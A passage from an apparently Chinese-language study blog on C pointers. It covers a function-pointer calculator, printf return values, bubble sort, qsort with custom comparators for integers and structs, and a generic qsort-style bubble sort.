y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x - y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Mul</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x * y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">div</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (x / y);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1.add\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2.sub\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;3.mul\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4.div\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0.exit\n&quot;</span>);</span><br><span class="line"> &#125; </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> (*pf1)(<span class="type">int</span>, <span class="type">int</span>) = Add;</span><br><span class="line">    <span class="type">int</span> (*pf2)(<span class="type">int</span>, <span class="type">int</span>) = Sub;</span><br><span class="line">    <span class="comment">// pfArr[2] + int(*)(int, int)  </span></span><br><span class="line">    <span class="type">int</span> (*pfArr[<span class="number">2</span>])(<span class="type">int</span>, <span class="type">int</span>) = &#123;Add, Sub&#125;;</span><br><span class="line">    <span class="comment">//*pfArr 就是函数指针数组 </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//计算器-计算整型变量的加、减、乘、除。 </span></span><br><span class="line">    <span class="type">int</span> input = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        menu();</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请选择：&gt;&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">        <span class="keyword">switch</span> (input)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;请输入俩个操作数&gt;:&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line">                ret = Add(x, y);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;请输入俩个操作数&gt;:&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line">                ret = Sub(x, y);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;请输入俩个操作数&gt;:&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line">                ret = Mul(x, y);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;请输入俩个操作数&gt;:&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line">                ret = div(x, y);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;退出程序&quot;</span>);</span><br><span class="line">                input = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;选择错误，请重新选择&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ret = %d\n&quot;</span>, ret);</span><br><span class="line">    &#125; <span class="keyword">while</span> (input);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法二</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//计算器-计算整型变量的加、减、乘、除。</span></span><br><span class="line">    <span class="comment">//a&amp;b a^b a|b a&gt;&gt;b a&lt;&lt;b a&gt;b </span></span><br><span class="line">    <span class="type">int</span> input = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="type">int</span> (*pfArr[<span class="number">5</span>])(<span class="type">int</span>, <span class="type">int</span>) = &#123;<span class="literal">NULL</span>, Add, Sub, Mul, div&#125;;</span><br><span class="line">        <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请选择：&gt;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">        <span class="keyword">if</span> (input &gt;= <span class="number">1</span> &amp;&amp; input &lt;= <span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入2个操作数&gt;:&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y); </span><br><span class="line">            ret = (pfArr[input])(x, y);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ret = %d\n&quot;</span>, ret);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (input == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;退出\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;选择错误\n&quot;</span>);</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125; <span class="keyword">while</span> (input);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>描述<br>KiKi写了一个输出“Hello world!”的程序，BoBo老师告诉他printf函数有返回值，你能帮他写个程序输出printf(“Hello world!”)的返回值吗？<br>输入描述：<br>无<br>输出描述：<br>包括两行：<br>第一行为“Hello world!”<br>第二行为printf(“Hello world!”)调用后的返回值。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//printf函数源码</span></span><br><span class="line"><span class="comment">//int __cdecl printf(const char * __restrict__ _Format,...);</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="built_in">printf</span>(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,  a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BC15-大小写转换"><a href="#BC15-大小写转换" class="headerlink" title="BC15 大小写转换"></a>BC15 大小写转换</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> ch = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((ch = getchar()) != EOF) &#123; </span><br><span class="line">    <span class="comment">//EOF意为-1。本语句即只要输入项是字符即可打印</span></span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">putchar</span>(ch + <span class="number">32</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="指针进阶6"><a href="#指针进阶6" class="headerlink" title="指针进阶6"></a>指针进阶6</h3><p>复习冒泡排序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bubble_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; sz - <span class="number">1</span> - i; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>])&#123;</span><br><span class="line">                <span class="type">int</span> tmp = arr[j + <span class="number">1</span>];</span><br><span class="line">                arr[j + <span class="number">1</span>] = arr[j];</span><br><span class="line">                arr[j] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;   </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123;<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> sz = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line">    bubble_sort(arr, sz);</span><br><span class="line">    print(arr, sz); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/rOnPdWCTq8RmgYL.png" alt="image.png"></p><h4 id="qsort-x2F-x2F-快速排序"><a href="#qsort-x2F-x2F-快速排序" class="headerlink" title="qsort();&#x2F;&#x2F;快速排序"></a>qsort();&#x2F;&#x2F;快速排序</h4><p>整型数据，字符串数据，结构体数据都可以排</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">qsort</span><span class="params">(<span class="type">void</span> *base,<span class="comment">//base 中存放的是待排序数据中第一个对象的地址 </span></span></span><br><span class="line"><span class="params">                 <span class="type">size_t</span> nitems, <span class="comment">//num 是待排序数据的元素个数</span></span></span><br><span class="line"><span class="params">                 <span class="type">size_t</span> size, <span class="comment">//size 排序中一个元素的大小 </span></span></span><br><span class="line"><span class="params">                 <span class="type">int</span> (*compar)(<span class="type">const</span> <span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span>*) <span class="comment">//指向函数的指针，用于确定排序的顺序（需要用户自定义一个比较函数） </span></span></span><br><span class="line"><span class="params">                 )</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">//因为void不知道什么类型，所以要先强制转换类型，而qsort对比较函数只要求和0的关系</span></span><br><span class="line"><span class="comment">//所以直接return 差值即可 </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">cmp_int</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* e1, <span class="type">const</span> <span class="type">void</span>* e2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span>*)e1 - *(<span class="type">int</span>*)e2;</span><br><span class="line"> &#125; </span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123;<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> sz = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line">    qsort(arr, sz, <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]), cmp_int);</span><br><span class="line">    print(arr, sz); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/PoDyjkpAuZ8CMmf.png" alt="image.png"></p><h4 id="qsort函数排序结构体"><a href="#qsort函数排序结构体" class="headerlink" title="qsort函数排序结构体"></a>qsort函数排序结构体</h4><p>1.按年龄排序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stu</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">&#125;; </span><br><span class="line"><span class="type">int</span> <span class="title function_">sort_by_age</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* e1, <span class="type">const</span> <span class="type">void</span>* e2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">struct</span> Stu*)e1)-&gt;age - ((<span class="keyword">struct</span> Stu*)e2)-&gt;age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="keyword">struct</span> Stu s[], <span class="type">int</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Stu</span> *<span class="title">p</span>;</span></span><br><span class="line">    p = s;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i++)</span><br><span class="line">    &#123;   </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Stu%d\n&quot;</span>,i);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;name:%s\n&quot;</span>, p-&gt;name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;age:%d\n&quot;</span>, p-&gt;age);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//使用qsort排序结构体数据 </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Stu</span> <span class="title">s</span>[] =</span> &#123;</span><br><span class="line">        &#123;<span class="string">&quot;zhangsan&quot;</span>, <span class="number">30</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;liso&quot;</span>, <span class="number">35</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;wangwu&quot;</span>, <span class="number">20</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> sz = <span class="keyword">sizeof</span>(s) / <span class="keyword">sizeof</span>(s[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">//按年龄排序</span></span><br><span class="line">    </span><br><span class="line">    qsort(s, sz, <span class="keyword">sizeof</span>(s[<span class="number">0</span>]), sort_by_age);</span><br><span class="line">    print(s, sz);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    test2();</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/I8lagQoBthpbJdj.png" alt="image.png"></p><p>2.按名字排序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stu</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">&#125;; </span><br><span class="line"><span class="type">int</span> <span class="title function_">sort_by_name</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* e1, <span class="type">const</span> <span class="type">void</span>* e2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcmp</span>(((<span class="keyword">struct</span> Stu*)e1)-&gt;name, ((<span class="keyword">struct</span> Stu*)e2)-&gt;name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="keyword">struct</span> Stu s[], <span class="type">int</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Stu</span> *<span class="title">p</span>;</span></span><br><span class="line">    p = s;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i++)</span><br><span class="line">    &#123;   </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Stu%d\n&quot;</span>,i);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;name:%s\n&quot;</span>, p-&gt;name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;age:%d\n&quot;</span>, p-&gt;age);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//使用qsort排序结构体数据 </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Stu</span> <span class="title">s</span>[] =</span> &#123;</span><br><span class="line">        &#123;<span class="string">&quot;zhangsan&quot;</span>, <span class="number">30</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;liso&quot;</span>, <span class="number">35</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;wangwu&quot;</span>, <span class="number">20</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> sz = <span class="keyword">sizeof</span>(s) / <span class="keyword">sizeof</span>(s[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">//按名字排序</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;突然想看下s中元素的大小%d\n&quot;</span>,<span class="keyword">sizeof</span>(s[<span class="number">0</span>]));</span><br><span class="line">    qsort(s, sz, <span class="keyword">sizeof</span>(s[<span class="number">0</span>]), sort_by_name);</span><br><span class="line">    print(s, sz);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    test2();</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><p><em>一个char 8bit&#x3D;1byte 一个int 4byte 所以是24</em><br><img src="https://s2.loli.net/2023/03/12/LwpS6mz3bsEPlid.png" alt="image.png"></p><p>3.突然想看下string.h中的strcmp源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">strcmp</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">char</span> * src,</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">char</span> * dst</span></span><br><span class="line"><span class="params">        )</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span> ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((ret = *(<span class="type">unsigned</span> <span class="type">char</span> *)src - *(<span class="type">unsigned</span> <span class="type">char</span> *)dst) == <span class="number">0</span> &amp;&amp; *dst)</span><br><span class="line">                &#123;</span><br><span class="line">                ++src, ++dst;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ((-ret) &lt; <span class="number">0</span>) - (ret &lt; <span class="number">0</span>); <span class="comment">// (if positive) - (if negative) generates branchless code</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看不懂，试着自己实现一个</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">str_cmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str1, <span class="type">const</span> <span class="type">char</span>* str2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (*str1 == *str2) &#123;</span><br><span class="line">        str1++;</span><br><span class="line">        str2++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> ret = *str1 - *str2;</span><br><span class="line">    <span class="keyword">return</span> ret; </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str1[] = <span class="string">&quot;abcde&quot;</span>;</span><br><span class="line">    <span class="type">char</span> str2[] = <span class="string">&quot;bca&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,str_cmp(str1, str2));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/U2tR96KOhZ5X7YP.png" alt="image.png"></p><h2 id="模仿qsort实现冒泡排序"><a href="#模仿qsort实现冒泡排序" class="headerlink" title="模仿qsort实现冒泡排序"></a>模仿qsort实现冒泡排序</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Swap</span><span class="params">(<span class="type">char</span>* buf1, <span class="type">char</span>* buf2, <span class="type">int</span> width)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; width; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> tmp = *buf1;</span><br><span class="line">        *buf1 = *buf2;</span><br><span class="line">        *buf2 =tmp;</span><br><span class="line">        buf1++;</span><br><span class="line">        buf2++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//模仿qsort实验一个冒泡排序的通用算法 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bubble_sort</span><span class="params">(<span class="type">void</span>* base,</span></span><br><span class="line"><span class="params">                <span class="type">int</span> sz,<span class="comment">//元素个数 </span></span></span><br><span class="line"><span class="params">                <span class="type">int</span> width, <span class="comment">//元素大小（几个字节） </span></span></span><br><span class="line"><span class="params">                <span class="type">int</span> (*cmp)(<span class="type">const</span> <span class="type">void</span>* e1, <span class="type">const</span> <span class="type">void</span>* e2)</span></span><br><span class="line"><span class="params">                )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//sz个元素进行sz-1趟 </span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz <span class="number">-1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//一趟排序 </span></span><br><span class="line">        <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; sz - <span class="number">1</span> - i; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//两个元素比较 </span></span><br><span class="line">            <span class="comment">//arr[j] arr[j+1]</span></span><br><span class="line">            <span class="keyword">if</span> (cmp((<span class="type">char</span>*)base + j * width, (<span class="type">char</span>*)base + (j + <span class="number">1</span>) * width) &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//交换 </span></span><br><span class="line">                Swap((<span class="type">char</span>*)base + j * width, (<span class="type">char</span>*)base + (j + <span class="number">1</span>) * width, width);</span><br><span class="line">            &#125;</span><br><span class="line">         &#125; </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">cmp_int</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* e1, <span class="type">const</span> <span class="type">void</span>* e2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span>*)e1 - *(<span class="type">int</span>*)e2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_arr</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> arr[] = &#123; <span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">9</span> &#125;;</span><br><span class="line">    